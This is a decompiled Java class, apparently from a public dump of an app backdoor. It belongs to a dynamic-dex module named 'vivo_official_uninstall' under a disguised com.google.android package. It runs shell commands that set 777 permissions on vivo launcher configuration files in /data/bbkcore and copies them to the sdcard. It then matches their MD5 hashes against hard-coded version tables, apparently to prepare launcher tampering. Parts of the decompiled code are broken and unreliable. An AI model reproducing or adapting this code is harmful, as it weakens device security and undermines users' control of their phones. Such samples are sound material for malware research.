package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.a.a;
import com.google.android.sd.utils.IoUtils;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public final class b {
  public static int a(int paramInt) {
    String str = String.format("/data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { Integer.valueOf(paramInt) });
    a.a("chmod 777 ".concat(String.valueOf(str)));
    File file = new File("sdcard", "BBKLauncher2_custom_temp.xml");
    StringBuilder stringBuilder = new StringBuilder("cp ");
    stringBuilder.append(str);
    stringBuilder.append(" ");
    stringBuilder.append(file.getAbsolutePath());
    a.a(stringBuilder.toString());
    if (!file.exists())
      return -1; 
    str = IoUtils.calFileMd5(file);
    if (str == null)
      return -1; 
    ArrayList<a> arrayList2 = new ArrayList();
    ArrayList<a> arrayList1 = new ArrayList();
    arrayList2.add(new a(1947, "7069150474AAFCB9541AB6559D6A9108", null));
    arrayList2.add(new a(1949, "4E4F11EACFA4B2A617F480DE4CE84414", null));
    Iterator<a> iterator2 = arrayList2.iterator();
    while (iterator2.hasNext()) {
      if (TextUtils.equals(((a)iterator2.next()).a, str))
        return 0; 
    } 
    arrayList1.add(new a(507, "F69C264291A684338B6DE40793D93CA5", "B79A16900B6F91FD004D22387EF3B47E"));
    arrayList1.add(new a(1220, "4831DAE78045897B3EE9D4E4B14C09AB", "06100EDA5750BADBB5FCD89BCBEA6D38"));
    arrayList1.add(new a(1221, "FE78B912C7FEB95A32127AB56C0075D9", "F9A7D5D068577538901783B192720800"));
    arrayList1.add(new a(1223, "56A41F0650DDE5E24A98A750A8E58246", "8BA543A1AEFEBFAA13187F9AB7202A96"));
    arrayList1.add(new a(1946, "C11B137D5CFF7632A23C2213511E0870", "91AB6A0B29E4A0175F792E232BAF2922"));
    arrayList1.add(new a(1948, "31D402DB994D478966DD0C72BDEAD2A2", "75BC643A7D7E7CF393EDF1B60DE95921"));
    arrayList1.add(new a(2303, "76BF2D4CFC655EF6E3F5721AF9DEC461", "2AF6BE62047289D43B57BB18CD6723BF"));
    arrayList1.add(new a(2304, "2B7A141406D673B7EDB9DB3DC4D73B61", "B53CABF3DF5122EE48C8732C5AEC0764"));
    arrayList1.add(new a(2751, "1A2F4590EDE3E472DD1772A235251CA4", "C35CE886277459DA756C097E07CD8871"));
    arrayList1.add(new a(1223, "DFC583837962910FB0F92B3F6A03D917", "EA3C53C24A61C1525C6902115D5A6F5D"));
    arrayList1.add(new a(1948, "CEDB670E508911590509B81CA0E0C560", "BB4AF7C41FD8292E0139FDE60D706D4C"));
    arrayList1.add(new a(2303, "8CB2CDF69C364A35A4872D68A3EA8223", "038393FABE4CFAB5321A677FDC78B701"));
    arrayList1.add(new a(2304, "8DDCE584F2082F52ED06E2971BD309D6", "2AE317ED4878AF26249F25BC941EFB45"));
    arrayList1.add(new a(3507, "65B8FEC83A0944C8FEE20197F5BFA319", "CB3BE0B0A6D8A2E7E53EEFE4D4E46DCA"));
    Iterator<a> iterator1 = arrayList1.iterator();
    while (iterator1.hasNext()) {
      if (TextUtils.equals(((a)iterator1.next()).b, str))
        return 1; 
    } 
    return 2;
  }
  
  private static int a(List<File> paramList) {
    int i = 0;
    int k = 0;
    for (int j = 0; i < paramList.size(); j = m) {
      String str = ((File)paramList.get(i)).getName();
      int i1 = str.lastIndexOf("_") + 1;
      int i2 = str.length() - 4;
      int n = k;
      int m = j;
      if (i2 > i1) {
        i1 = Integer.parseInt(str.substring(i1, i2));
        n = k;
        m = j;
        if (i1 > j) {
          n = i;
          m = i1;
        } 
      } 
      i++;
      k = n;
    } 
    return k;
  }
  
  public static File a() {
    int i = 0;
    ArrayList<File> arrayList = new ArrayList(0);
    try {
      File file = new File("/data/bbkcore");
      if (file.isDirectory()) {
        File[] arrayOfFile = file.listFiles();
        if (arrayOfFile != null && arrayOfFile.length > 0) {
          int j = arrayOfFile.length;
          while (i < j) {
            File file1 = arrayOfFile[i];
            if (file1.getName().matches("BBKLauncher2_custom_[0-9]*\\.xml"))
              arrayList.add(file1); 
            i++;
          } 
        } 
      } 
    } finally {
      Exception exception;
    } 
    return (arrayList.size() == 0) ? null : arrayList.get(a(arrayList));
  }
  
  public static String a(File paramFile) {
    FileInputStream fileInputStream;
    File file = null;
    try {
      fileInputStream = new FileInputStream(paramFile);
    } finally {
      paramFile = null;
    } 
    if (fileInputStream != null) {
      paramFile = file;
      fileInputStream.close();
    } 
    return null;
  }
  
  private static String a(InputStream paramInputStream) {
    // Byte code:
    //   0: ldc 'MD5'
    //   2: invokestatic getInstance : (Ljava/lang/String;)Ljava/security/MessageDigest;
    //   5: astore #6
    //   7: sipush #1024
    //   10: newarray byte
    //   12: astore #7
    //   14: iconst_0
    //   15: istore_2
    //   16: aload_0
    //   17: aload #7
    //   19: iconst_0
    //   20: sipush #1024
    //   23: invokevirtual read : ([BII)I
    //   26: istore_1
    //   27: iload_1
    //   28: iflt -> 54
    //   31: aload #6
    //   33: aload #7
    //   35: iconst_0
    //   36: iload_1
    //   37: invokevirtual update : ([BII)V
    //   40: aload_0
    //   41: aload #7
    //   43: iconst_0
    //   44: sipush #1024
    //   47: invokevirtual read : ([BII)I
    //   50: istore_1
    //   51: goto -> 27
    //   54: aload #6
    //   56: invokevirtual digest : ()[B
    //   59: astore_0
    //   60: bipush #16
    //   62: newarray char
    //   64: astore #6
    //   66: aload #6
    //   68: iconst_0
    //   69: bipush #48
    //   71: castore
    //   72: aload #6
    //   74: iconst_1
    //   75: bipush #49
    //   77: castore
    //   78: aload #6
    //   80: iconst_2
    //   81: bipush #50
    //   83: castore
    //   84: aload #6
    //   86: iconst_3
    //   87: bipush #51
    //   89: castore
    //   90: aload #6
    //   92: iconst_4
    //   93: bipush #52
    //   95: castore
    //   96: aload #6
    //   98: iconst_5
    //   99: bipush #53
    //   101: castore
    //   102: aload #6
    //   104: bipush #6
    //   106: bipush #54
    //   108: castore
    //   109: aload #6
    //   111: bipush #7
    //   113: bipush #55
    //   115: castore
    //   116: aload #6
    //   118: bipush #8
    //   120: bipush #56
    //   122: castore
    //   123: aload #6
    //   125: bipush #9
    //   127: bipush #57
    //   129: castore
    //   130: aload #6
    //   132: bipush #10
    //   134: bipush #65
    //   136: castore
    //   137: aload #6
    //   139: bipush #11
    //   141: bipush #66
    //   143: castore
    //   144: aload #6
    //   146: bipush #12
    //   148: bipush #67
    //   150: castore
    //   151: aload #6
    //   153: bipush #13
    //   155: bipush #68
    //   157: castore
    //   158: aload #6
    //   160: bipush #14
    //   162: bipush #69
    //   164: castore
    //   165: aload #6
    //   167: bipush #15
    //   169: bipush #70
    //   171: castore
    //   172: aload_0
    //   173: arraylength
    //   174: iconst_2
    //   175: imul
    //   176: newarray char
    //   178: astore #7
    //   180: aload_0
    //   181: arraylength
    //   182: istore #4
    //   184: iconst_0
    //   185: istore_3
    //   186: iload_2
    //   187: istore_1
    //   188: iload_3
    //   189: istore_2
    //   190: goto -> 216
    //   193: new java/lang/String
    //   196: dup
    //   197: aload #7
    //   199: invokespecial <init> : ([C)V
    //   202: astore_0
    //   203: aload_0
    //   204: areturn
    //   205: astore_0
    //   206: aload_0
    //   207: invokevirtual printStackTrace : ()V
    //   210: aconst_null
    //   211: areturn
    //   212: astore_0
    //   213: goto -> 210
    //   216: iload_1
    //   217: iload #4
    //   219: if_icmpge -> 193
    //   222: aload_0
    //   223: iload_1
    //   224: baload
    //   225: istore_3
    //   226: iload_2
    //   227: iconst_1
    //   228: iadd
    //   229: istore #5
    //   231: aload #7
    //   233: iload_2
    //   234: aload #6
    //   236: iload_3
    //   237: iconst_4
    //   238: iushr
    //   239: bipush #15
    //   241: iand
    //   242: caload
    //   243: castore
    //   244: iload #5
    //   246: iconst_1
    //   247: iadd
    //   248: istore_2
    //   249: aload #7
    //   251: iload #5
    //   253: aload #6
    //   255: iload_3
    //   256: bipush #15
    //   258: iand
    //   259: caload
    //   260: castore
    //   261: iload_1
    //   262: iconst_1
    //   263: iadd
    //   264: istore_1
    //   265: goto -> 216
    // Exception table:
    //   from	to	target	type
    //   0	14	205	java/security/NoSuchAlgorithmException
    //   0	14	212	java/lang/Exception
    //   16	27	205	java/security/NoSuchAlgorithmException
    //   16	27	212	java/lang/Exception
    //   31	51	205	java/security/NoSuchAlgorithmException
    //   31	51	212	java/lang/Exception
    //   54	66	205	java/security/NoSuchAlgorithmException
    //   54	66	212	java/lang/Exception
    //   172	184	205	java/security/NoSuchAlgorithmException
    //   172	184	212	java/lang/Exception
    //   193	203	205	java/security/NoSuchAlgorithmException
    //   193	203	212	java/lang/Exception
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\183bb87aa7d744a195741ce524577dd0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */